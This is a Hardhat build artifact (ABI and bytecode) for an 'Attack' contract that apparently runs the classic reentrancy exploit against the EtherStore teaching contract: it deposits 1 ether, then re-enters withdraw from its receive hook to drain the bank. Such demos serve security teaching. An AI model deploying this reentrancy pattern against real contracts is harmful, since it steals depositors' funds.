{
  "_format": "hh-sol-artifact-1",
  "contractName": "Attack",
  "sourceName": "contracts/EtherStore-Attack.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_thebankAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "balances",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "etherStore",
      "outputs": [
        {
          "internalType": "contract EtherStore",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBalances",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516105a13803806105a1833981810160405281019061003291906100db565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b6100b88161009d565b81146100c357600080fd5b50565b6000815190506100d5816100af565b92915050565b6000602082840312156100f1576100f0610078565b5b60006100ff848285016100c6565b91505092915050565b61048a806101176000396000f3fe6080604052600436106100425760003560e01c8062113e081461011557806327e235e3146101405780639e5faafc1461017d578063acd2e6e51461018757610110565b3661011057670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16311061010e5760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d4e932926040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100f557600080fd5b505af1158015610109573d6000803e3d6000fd5b505050505b005b600080fd5b34801561012157600080fd5b5061012a6101b2565b604051610137919061032f565b60405180910390f35b34801561014c57600080fd5b50610167600480360381019061016291906103ad565b6101ba565b604051610174919061032f565b60405180910390f35b6101856101d2565b005b34801561019357600080fd5b5061019c6102f2565b6040516101a99190610439565b60405180910390f35b600047905090565b60016020528060005260406000206000915090505481565b670de0b6b3a76400003410156101e757600080fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561025757600080fd5b505af115801561026b573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d4e932926040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156102d857600080fd5b505af11580156102ec573d6000803e3d6000fd5b50505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000819050919050565b61032981610316565b82525050565b60006020820190506103446000830184610320565b92915050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061037a8261034f565b9050919050565b61038a8161036f565b811461039557600080fd5b50565b6000813590506103a781610381565b92915050565b6000602082840312156103c3576103c261034a565b5b60006103d184828501610398565b91505092915050565b6000819050919050565b60006103ff6103fa6103f58461034f565b6103da565b61034f565b9050919050565b6000610411826103e4565b9050919050565b600061042382610406565b9050919050565b61043381610418565b82525050565b600060208201905061044e600083018461042a565b9291505056fea2646970667358221220a5ba2d3a8989f375b69f3d6a6da8ff264490695ee5c93f0bc379e1d5da83eadc64736f6c63430008120033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}